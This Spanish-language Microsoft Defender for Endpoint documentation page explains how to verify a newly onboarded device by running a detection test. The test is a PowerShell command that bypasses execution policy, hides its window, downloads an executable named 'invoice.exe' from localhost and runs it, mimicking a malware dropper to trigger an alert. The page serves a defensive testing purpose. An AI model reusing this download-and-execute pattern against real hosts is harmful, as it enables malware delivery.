---
title: Ejecutar una prueba de detección después de agregar un dispositivo a Microsoft Defender para el dispositivo endpoint
description: Ejecute el script de detección en un dispositivo que se ha agregado recientemente al servicio de Microsoft Defender para endpoints para comprobar que está correctamente incorporado.
keywords: prueba de detección, detección, powershell, script, comprobación, incorporación, Microsoft Defender para incorporación de puntos de conexión, clientes, servidores, prueba
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 3ae3f6cfbdf1452b47f1bd91029c6a481eff5761
ms.sourcegitcommit: a0185d6b0dd091db6e1e1bfae2f68ab0e3cf05e5
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 08/13/2021
ms.locfileid: "58256918"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Ejecutar una prueba de detección en un dispositivo de Microsoft Defender para endpoint recién incorporado 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Se aplica a:**
- Versiones Windows 10 compatibles
- Windows Server 2012 R2
- Windows Server 2016
- Windows Servidor, versión 1803
- Windows Server, 2019
- [Microsoft Defender para punto de conexión](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> ¿Quiere experimentar Microsoft Defender para punto de conexión? [Regístrese para obtener una prueba gratuita.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

Los dispositivos de incorporación son el método para agregar dispositivos al servicio de Microsoft Defender para endpoints. Permite a los dispositivos notificar señales al servicio.  

Comprobar que un dispositivo se ha agregado correctamente al servicio es un paso importante en todo el proceso de implementación. 

## <a name="verify-onboarding-using-a-detection-test"></a>Comprobar la incorporación mediante una prueba de detección
Ejecute el siguiente script de PowerShell en un dispositivo recién incorporado para comprobar que está informando correctamente al servicio Defender for Endpoint.

1. Cree una carpeta: 'C:\test-MDATP-test'.
2. Abra un símbolo del sistema con privilegios elevados en el dispositivo y ejecute el script:

   1. Vaya a **Inicio** y escriba **cmd**.

   1. Haga clic con el **botón secundario en Símbolo del sistema** y seleccione Ejecutar como **administrador**.

      ![Ventana menú Inicio apuntar a Ejecutar como administrador](images/run-as-admin.png)

3. En el símbolo del sistema, copie y ejecute el siguiente comando:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

La ventana símbolo del sistema se cerrará automáticamente. Si se realiza correctamente, la prueba de detección se marcará como completada y aparecerá una nueva alerta en el portal del dispositivo incorporado en aproximadamente 10 minutos.

## <a name="related-topics"></a>Temas relacionados
- [Incorporar dispositivos Windows 10 mediante la directiva de grupo](configure-endpoints.md)
- [Servidores integrados](configure-server-endpoints.md)
- [Solucionar problemas de incorporación de puntos de conexión de Microsoft Defender](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
